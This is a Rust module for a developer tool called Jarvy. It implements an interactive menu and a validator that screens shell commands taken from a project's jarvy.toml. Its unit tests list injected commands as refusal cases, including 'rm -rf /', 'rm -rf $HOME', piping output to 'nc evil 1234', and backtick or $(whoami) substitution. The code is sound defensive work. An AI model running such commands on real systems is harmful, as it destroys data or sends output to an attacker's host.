//! Interactive menu and user prompts
//!
//! This module handles the interactive menu that appears when Jarvy is run
//! without a subcommand, including first-run welcome experience.

use inquire::{InquireError, Select};

use crate::commands;
use crate::config::CommandsConfig;
use crate::onboarding::{WelcomeBannerConfig, is_first_run, mark_initialized, show_welcome_banner};
use crate::output::Outputable;
use crate::setup::setup;

/// Display the interactive menu for users who run jarvy without a subcommand
pub fn user_select() {
    // Test mode: avoid interactive prompts and side-effects
    if std::env::var("JARVY_TEST_MODE").as_deref() == Ok("1") {
        println!("TEST: user_select invoked");
        return;
    }

    // Check if this is the first run
    if is_first_run() {
        // Show welcome banner for first-time users
        let use_colors = std::io::IsTerminal::is_terminal(&std::io::stdout());
        show_welcome_banner(&WelcomeBannerConfig {
            enabled: true,
            use_colors,
        });

        // Offer first-run options
        let options = vec![
            "Run quickstart (guided setup)",
            "Create a config (jarvy init)",
            "Browse templates",
            "Skip for now",
        ];

        let selection: Result<&str, InquireError> =
            Select::new("How would you like to get started?", options).prompt();

        match selection {
            Ok(choice) => match choice {
                "Run quickstart (guided setup)" => {
                    let options = commands::quickstart::QuickstartOptions::default();
                    let result = commands::quickstart::run_quickstart(options);
                    println!("{}", result.to_human());
                    // Mark as initialized after quickstart
                    let _ = mark_initialized();
                }
                "Create a config (jarvy init)" => {
                    let options = commands::init::InitOptions::default();
                    let result = commands::init::run_init(options);
                    print!("{}", result.to_human());
                    // Mark as initialized after init
                    let _ = mark_initialized();
                }
                "Browse templates" => {
                    let result = commands::templates::list_templates();
                    println!("{}", result.to_human());
                }
                _ => {
                    println!("\nYou can always run these later:");
                    println!("  \x1b[36mjarvy quickstart\x1b[0m  - Guided setup");
                    println!("  \x1b[36mjarvy init\x1b[0m        - Create a config");
                    println!("  \x1b[36mjarvy templates\x1b[0m   - Browse templates\n");
                }
            },
            Err(_) => {
                println!("No choice was made");
            }
        }
        return;
    }

    // Load project commands config from jarvy.toml if present
    let commands_config = load_commands_config();

    // Normal flow for returning users
    print_logo();

    println!("\t\tHi, I'm Jarvy! I'm here to help you get your development environment set up.");

    // Build options. The three well-known slots come first; any extra
    // `[commands]` keys (e.g. `format`, `migrate`, `publish`) are
    // surfaced as "Run <name>" entries so a `dotnet-api` jarvy.toml's
    // `format = "dotnet csharpier ."` is actually invokable instead of
    // silently dropped by the parser.
    let mut options: Vec<String> = vec![
        "Run the project".to_string(),
        "Test the project".to_string(),
        "Development environment setup".to_string(),
    ];
    let mut extra_keys: Vec<&str> = commands_config
        .extras
        .keys()
        .map(String::as_str)
        .filter(|k| !matches!(*k, "run" | "test" | "setup"))
        .collect();
    extra_keys.sort_unstable();
    for k in &extra_keys {
        options.push(format!("Run `{}`", k));
    }

    let display_options: Vec<&str> = options.iter().map(String::as_str).collect();
    let selection: Result<&str, InquireError> =
        Select::new("What would you like to do today?", display_options).prompt();

    match selection {
        Ok(choice) => match choice {
            "Run the project" => {
                run_shell_command(commands_config.run.as_deref().unwrap_or("cargo run"), "run");
            }
            "Test the project" => {
                run_shell_command(
                    commands_config.test.as_deref().unwrap_or("cargo test"),
                    "test",
                );
            }
            "Development environment setup" => {
                if let Some(ref cmd) = commands_config.setup {
                    run_shell_command(cmd, "setup");
                } else {
                    setup();
                }
            }
            other => {
                // "Run `<name>`" — look up the extra by stripping the
                // wrapper. Falls through to no-op if the user backed out.
                if let Some(name) = other
                    .strip_prefix("Run `")
                    .and_then(|s| s.strip_suffix('`'))
                    && let Some(cmd) = commands_config.extras.get(name)
                {
                    run_shell_command(cmd, name);
                }
            }
        },
        Err(_) => {
            println!("No choice was made")
        }
    }
}

/// Load the [commands] section from jarvy.toml in the current directory.
fn load_commands_config() -> CommandsConfig {
    let path = std::path::Path::new("jarvy.toml");
    if !path.exists() {
        return CommandsConfig::default();
    }
    let Ok(contents) = std::fs::read_to_string(path) else {
        return CommandsConfig::default();
    };
    // Partial parse: only extract the commands section
    #[derive(serde::Deserialize, Default)]
    struct Partial {
        #[serde(default)]
        commands: CommandsConfig,
    }
    toml::from_str::<Partial>(&contents)
        .map(|p| p.commands)
        .unwrap_or_default()
}

/// Default `run` command. Single source of truth so the SAFE_DEFAULTS check
/// can never drift away from the actual default text.
pub(crate) const DEFAULT_RUN: &str = "cargo run";
/// Default `test` command. Same rationale as DEFAULT_RUN.
pub(crate) const DEFAULT_TEST: &str = "cargo test";
/// Known-safe default commands that don't require confirmation. EXACT match
/// only — `"cargo run --release"` does NOT count as a safe default.
const SAFE_DEFAULTS: &[&str] = &[DEFAULT_RUN, DEFAULT_TEST];

/// Shell metacharacters that almost always indicate a multi-command attempt.
/// We refuse outright rather than relying on the prompt.
const HARD_BLOCKED_METACHARS: &[char] = &[';', '|', '&', '\n', '\r', '`'];

/// Result of validating a command string from jarvy.toml.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum ShellCommandPolicy {
    SafeDefault,
    NeedsConfirmation,
    Refused(&'static str),
}

/// Returns true when the command string contains a NUL byte or a metachar
/// that indicates command chaining / substitution.
pub(crate) fn classify_shell_command(cmd: &str) -> ShellCommandPolicy {
    if cmd.contains('\0') {
        return ShellCommandPolicy::Refused("command contains NUL byte");
    }
    if cmd.contains("$(") {
        return ShellCommandPolicy::Refused("command-substitution `$(...)` is not allowed");
    }
    if cmd.contains(HARD_BLOCKED_METACHARS) {
        return ShellCommandPolicy::Refused(
            "command contains a chaining/substitution metachar (`;`, `|`, `&`, backtick, newline)",
        );
    }
    if SAFE_DEFAULTS.contains(&cmd) {
        return ShellCommandPolicy::SafeDefault;
    }
    ShellCommandPolicy::NeedsConfirmation
}

/// Strip ANSI escape sequences and other control characters from text that
/// will be displayed to the user. Prevents a malicious jarvy.toml from
/// hiding parts of a command behind escape codes during the y/n prompt.
pub(crate) fn sanitize_for_display(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\x1b' {
            // Skip CSI sequences `ESC [ ... letter`.
            if matches!(chars.peek(), Some('[')) {
                chars.next();
                while let Some(&n) = chars.peek() {
                    chars.next();
                    if n.is_ascii_alphabetic() {
                        break;
                    }
                }
            }
            continue;
        }
        if (c as u32) < 0x20 && c != '\t' {
            out.push('?');
            continue;
        }
        out.push(c);
    }
    out
}

/// Run a shell command string, displaying its output.
/// If the command is a custom one from jarvy.toml (not a safe default),
/// the user is prompted to confirm before execution.
fn run_shell_command(cmd: &str, label: &str) {
    match classify_shell_command(cmd) {
        ShellCommandPolicy::SafeDefault => {}
        ShellCommandPolicy::Refused(reason) => {
            tracing::warn!(
                event = "interactive.command.refused",
                label = %label,
                reason = %reason,
            );
            eprintln!(
                "\x1b[31m[SECURITY]\x1b[0m Refusing to run {} command: {}",
                label, reason
            );
            return;
        }
        ShellCommandPolicy::NeedsConfirmation => {
            let display = sanitize_for_display(cmd);
            println!(
                "\n\x1b[33m[SECURITY]\x1b[0m Custom {} command from jarvy.toml:",
                label
            );
            println!("  \x1b[1m{}\x1b[0m\n", display);
            let confirm = inquire::Confirm::new("Execute this command?")
                .with_default(false)
                .prompt();
            match confirm {
                Ok(true) => {}
                _ => {
                    println!("Command cancelled.");
                    return;
                }
            }
        }
    }

    let safe_default = SAFE_DEFAULTS.contains(&cmd);
    let cmd_hash = {
        use sha2::{Digest, Sha256};
        let bytes = Sha256::digest(cmd.as_bytes());
        hex::encode(&bytes[..8])
    };
    let start = std::time::Instant::now();
    tracing::info!(
        event = "interactive.command.start",
        label = %label,
        cmd_hash = %cmd_hash,
        is_default = safe_default,
    );

    println!("Running {} command: {}", label, cmd);
    match std::process::Command::new("sh").arg("-c").arg(cmd).status() {
        Ok(status) => {
            tracing::info!(
                event = "interactive.command.complete",
                label = %label,
                cmd_hash = %cmd_hash,
                exit_code = status.code().unwrap_or(-1),
                duration_ms = start.elapsed().as_millis() as u64,
            );
            if !status.success() {
                eprintln!(
                    "{} command exited with code {}",
                    label,
                    status.code().unwrap_or(-1)
                );
            }
        }
        Err(e) => {
            tracing::warn!(
                event = "interactive.command.failed",
                label = %label,
                cmd_hash = %cmd_hash,
                error = %e,
            );
            eprintln!("Failed to execute {} command: {}", label, e);
        }
    }
}

#[cfg(test)]
#[allow(clippy::items_after_test_module)]
mod tests {
    use super::*;

    #[test]
    fn safe_defaults_match_named_constants() {
        // Ensures the allowlist can never drift from the default text used
        // by the menu — both refer to the same `const`.
        assert!(SAFE_DEFAULTS.contains(&DEFAULT_RUN));
        assert!(SAFE_DEFAULTS.contains(&DEFAULT_TEST));
    }

    #[test]
    fn safe_defaults_pass_classification() {
        assert_eq!(
            classify_shell_command("cargo run"),
            ShellCommandPolicy::SafeDefault
        );
        assert_eq!(
            classify_shell_command("cargo test"),
            ShellCommandPolicy::SafeDefault
        );
    }

    #[test]
    fn similar_command_requires_confirmation_not_safe_match() {
        assert_eq!(
            classify_shell_command("cargo run --release"),
            ShellCommandPolicy::NeedsConfirmation,
            "starts_with-style match would have made this 'safe' — must NOT"
        );
        assert_eq!(
            classify_shell_command("cargo runtests"),
            ShellCommandPolicy::NeedsConfirmation
        );
    }

    #[test]
    fn refuses_chaining_metacharacters() {
        for bad in [
            "cargo run; rm -rf /",
            "cargo run && rm -rf $HOME",
            "cargo run | nc evil 1234",
            "cargo run\nrm -rf /",
            "cargo run`whoami`",
            "cargo run $(whoami)",
        ] {
            assert!(
                matches!(classify_shell_command(bad), ShellCommandPolicy::Refused(_)),
                "expected refusal for: {bad}"
            );
        }
    }

    #[test]
    fn refuses_nul_byte() {
        assert!(matches!(
            classify_shell_command("cargo run\0extra"),
            ShellCommandPolicy::Refused(_)
        ));
    }

    #[test]
    fn sanitize_strips_ansi_escapes() {
        let raw = "\x1b[31mevil\x1b[0m cargo test";
        let cleaned = sanitize_for_display(raw);
        assert_eq!(cleaned, "evil cargo test");
    }

    #[test]
    fn sanitize_replaces_control_chars() {
        let raw = "abc\x07def";
        let cleaned = sanitize_for_display(raw);
        assert_eq!(cleaned, "abc?def");
    }
}

/// Print the Jarvy logo banner
pub fn print_logo() {
    println!(
        "
 .----------------.
|   J A R V Y  ⚡   |
 '----------------'
    "
    );
}
